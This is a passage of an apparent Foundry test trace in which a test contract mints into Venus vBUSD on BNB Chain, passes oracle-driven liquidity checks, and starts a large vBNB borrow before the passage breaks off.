+    │   │   │   │   ├─ [2531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 12013773876054454289088894 [1.201e25]
+    │   │   │   │   ├─ [7974] 0x8612b1330575d3f2f792329C5c16d55f22433c3F::getBorrowRate(12013773876054454289088894 [1.201e25], 47390268353889518567385382 [4.739e25], 57182453111825619627855 [5.718e22]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000e263b2d8
+    │   │   │   │   ├─ emit AccrueInterest(cashPrior: 12013773876054454289088894 [1.201e25], interestAccumulated: 34019431201587074198 [3.401e19], borrowIndex: 1158245200425611495 [1.158e18], totalBorrows: 47390302373320720154459580 [4.739e25])
+    │   │   │   │   ├─ [60603] Unitroller::mintAllowed(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25])
+    │   │   │   │   │   ├─ [59923] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintAllowed(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25]) [delegatecall]
+    │   │   │   │   │   │   ├─ [2344] vBUSD::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 267885322979810306 [2.678e17]
+    │   │   │   │   │   │   ├─ [5844] vBUSD::exchangeRateStored() [staticcall]
+    │   │   │   │   │   │   │   ├─ [4534] vBUSD::delegateToImplementation(0x182df0f5) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2965] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::exchangeRateStored() [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 12013773876054454289088894 [1.201e25]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 221538417014331992775792933 [2.215e26]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000b74095a69aa07c9d771925
+    │   │   │   │   │   │   │   └─ ← [Return] 221538417014331992775792933 [2.215e26]
+    │   │   │   │   │   │   ├─ [344] vBUSD::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 267885322979810306 [2.678e17]
+    │   │   │   │   │   │   ├─ [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14801404367740170864091001 [1.48e25]
+    │   │   │   │   │   │   ├─ [5581] vBUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [4145] vBUSD::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2488] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ emit DistributedSupplierVenus(param0: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1458061503017301999466356090470642549036336 [1.458e42])
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 12013773876054454289088894 [1.201e25]
+    │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 12013773876054454289088894 [1.201e25]
+    │   │   │   │   ├─ [8834] BUSD::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], 11891269826866403367786530 [1.189e25])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], value: 11891269826866403367786530 [1.189e25])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], value: 115792089237316195423570985008687907853269984665640552148187757141509761853405 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   ├─ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 11891269826866403367786530 [1.189e25], mintTokens: 53675881533888187 [5.367e16])
+    │   │   │   │   ├─ emit Transfer(from: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 53675881533888187 [5.367e16])
+    │   │   │   │   ├─ [994] Unitroller::mintVerify(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25], 53675881533888187 [5.367e16])
+    │   │   │   │   │   ├─ [381] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintVerify(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25], 53675881533888187 [5.367e16]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [264996] Unitroller::getAccountLiquidity(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [264301] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::getAccountLiquidity(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   ├─ [258566] 0x50F618A2EAb0fB55e87682BbFd89e38acb2735cD::getHypotheticalAccountLiquidity(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 0, 0) [staticcall]
+    │   │   │   │   │   ├─ [2312] Unitroller::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   ├─ [1593] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   ├─ [9074] vUSDT::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   ├─ [7549] vUSDT::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   ├─ [5664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 85667293362416235809024304 [8.566e25]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 82945848211975141 [8.294e16], 0, 223379742247415412383608590 [2.233e26]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000126aecf3a44abe50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b8c680177952a8b8ccef0e
+    │   │   │   │   │   │   └─ ← [Return] 0, 82945848211975141 [8.294e16], 0, 223379742247415412383608590 [2.233e26]
+    │   │   │   │   │   ├─ [5550] Unitroller::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   ├─ [4855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   ├─ [3160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   ├─ [2492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   ├─ [60001] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   ├─ [54932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   ├─ [39619] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [34550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   ├─ [2425] USDT::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   ├─ [5640] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   ├─ [11143] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [7410] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 34996 [3.499e4], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 34996 [3.499e4]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419138228 [3.689e19], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 36893488147419138228 [3.689e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   ├─ [9074] vBUSD::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   ├─ [7549] vBUSD::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   ├─ [5664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000beb1ee0bd556bb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b74095a69aa07cc5f403db
+    │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   ├─ [5550] Unitroller::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   ├─ [4855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   ├─ [46501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   ├─ [45932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   ├─ [35119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [34550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   ├─ [2425] BUSD::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   ├─ [5640] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   ├─ [11143] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [7410] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 33916 [3.391e4], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 33916 [3.391e4]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419137148 [3.689e19], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 36893488147419137148 [3.689e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   ├─ [12774] vBNB::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 224118229180782046983303367 [2.241e26]
+    │   │   │   │   │   ├─ [5550] Unitroller::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   ├─ [4855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   ├─ [40845] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   ├─ [40276] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [31369] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [30800] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [5640] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   ├─ [11143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [7410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2207163 [2.207e6], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 2207163 [2.207e6]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147421310395 [3.689e19], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 36893488147421310395 [3.689e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   ├─ [3162] Unitroller::vaiController() [staticcall]
+    │   │   │   │   │   │   ├─ [2494] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::vaiController() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   ├─ [18810] 0x004065D34C6b18cE4370ced1CeBDE94865DbFAFE::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   ├─ [13639] 0x8A1e5Db8f622B97f4bCceC4684697199C1B1D11b::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [3230] Unitroller::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2559] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000146034c81ec2a58a80fe150000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0, 24632837225516975467331093 [2.463e25], 0
+    │   │   │   └─ ← [Return] 0, 24632837225516975467331093 [2.463e25], 0
+    │   │   ├─ [12357] VenusChainlinkOracle::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   ├─ [3056] vBNB::symbol() [staticcall]
+    │   │   │   │   └─ ← [Return] "vBNB"
+    │   │   │   ├─ [1140] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
+    │   │   │   │   ├─ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   └─ ← [Return] 8
+    │   │   │   ├─ [2137] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestAnswer() [staticcall]
+    │   │   │   │   ├─ [1141] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestAnswer() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24763280000 [2.476e10]
+    │   │   │   │   └─ ← [Return] 24763280000 [2.476e10]
+    │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   ├─ [265784] vBNB::borrow(99463293803544699126223 [9.946e22])
+    │   │   │   ├─ [8246] 0x8B5351D0568CEEFa9BfC71C7a11C01179B736d99::getBorrowRate(697436121250396034966511 [6.974e23], 527739077551936964960214 [5.277e23], 4912600833180578804956 [4.912e21]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000016fd58646
+    │   │   │   ├─ emit AccrueInterest(cashPrior: 697436121250396034966511 [6.974e23], interestAccumulated: 74906404252229112 [7.49e16], borrowIndex: 1234470480956995732 [1.234e18], totalBorrows: 527739152458341217189326 [5.277e23])
+    │   │   │   ├─ [165926] Unitroller::borrowAllowed(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22])
+    │   │   │   │   ├─ [165246] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::borrowAllowed(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22]) [delegatecall]
+    │   │   │   │   │   ├─ [11845] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   ├─ [11276] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [8369] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [7800] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1140] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   ├─ [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2207163 [2.207e6], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 2207163 [2.207e6]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147421310395 [3.689e19], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 36893488147421310395 [3.689e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   ├─ [410] vBNB::totalBorrows() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 527739152458341217189326 [5.277e23]
+    │   │   │   │   │   ├─ [103627] 0x50F618A2EAb0fB55e87682BbFd89e38acb2735cD::getHypotheticalAccountLiquidity(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], 0, 99463293803544699126223 [9.946e22]) [staticcall]
+    │   │   │   │   │   │   ├─ [2312] Unitroller::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
